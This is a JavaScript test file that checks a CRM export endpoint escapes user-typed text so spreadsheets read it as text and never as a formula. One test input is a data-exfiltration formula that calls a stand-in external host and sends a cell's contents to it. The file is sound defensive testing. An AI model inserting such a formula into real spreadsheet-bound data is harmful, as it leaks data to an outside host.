// What GET export hands the CRM bridge: text people typed reaches a sheet as text, never as a formula; a voided log
// sends nothing; a change made after a log was exported is exported again; a business added in the app gets its stage.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { start, logBody } from './team-helper.mjs';

const API = '/equipo/api';
const B = { bearer: 'push-token' };
const exportSince = async (s, since = '2026-11-01T00:00:00Z') => (await s.call('GET', `${API}/export?since=${encodeURIComponent(since)}`, undefined, B)).json;

test('export: text a person typed that a sheet would read as a formula starts with an apostrophe; ids and plain text stay as they are', async (t) => {
  const s = await start(); t.after(() => s.srv.close());
  const a = await s.admin();
  const m = await s.addRep(a.cookie, 'mario', { name: '@Mario Rep', city: '+Ciudad' });
  const C = { cookie: m.cookie };
  const evil = await s.call('POST', `${API}/log`, logBody('formula-0001', { kind: 'meeting', channel: 'visit', when: '2026-11-18', contact: '-Sr. X', note: '=IMAGE("https://x.example/?d="&A1)',
    lead: { name: '=1+1', zone: '@Centro' } }), C);
  assert.equal(evil.status, 200, evil.text);
  const plain = await s.call('POST', `${API}/log`, logBody('formula-0002', { lead: { name: 'Ferretería El Roble', zone: 'Vía España' }, note: 'Volver el martes' }), C);
  assert.equal(plain.status, 200, plain.text);
  const ex = await exportSince(s);
  const [one, two] = ex.logs;
  assert.deepEqual([one.lead.name, one.lead.zone, one.owner, one.contact, one.note], ["'=1+1", "'@Centro", "'@Mario Rep", "'-Sr. X", '\'=IMAGE("https://x.example/?d="&A1)']);
  assert.match(one.lead.id, /^APP-[0-9A-F]{8}$/);
  assert.deepEqual([one.id, one.day, one.when, one.handle], ['formula-0001', '2026-11-16', '2026-11-18', 'mario']);
  assert.deepEqual([two.lead.name, two.lead.zone, two.note], ['Ferretería El Roble', 'Vía España', 'Volver el martes']);
  const fresh = ex.newLeads.find((l) => l.id === one.lead.id);
  assert.deepEqual([fresh.company, fresh.zone, fresh.city], ["'=1+1", "'@Centro", "'+Ciudad"]);
  assert.equal(ex.newLeads.find((l) => l.id === two.lead.id).company, 'Ferretería El Roble');
  // the app itself keeps what was typed
  assert.equal(s.lines().find((e) => e.id === 'formula-0001').lead.name, '=1+1');
});
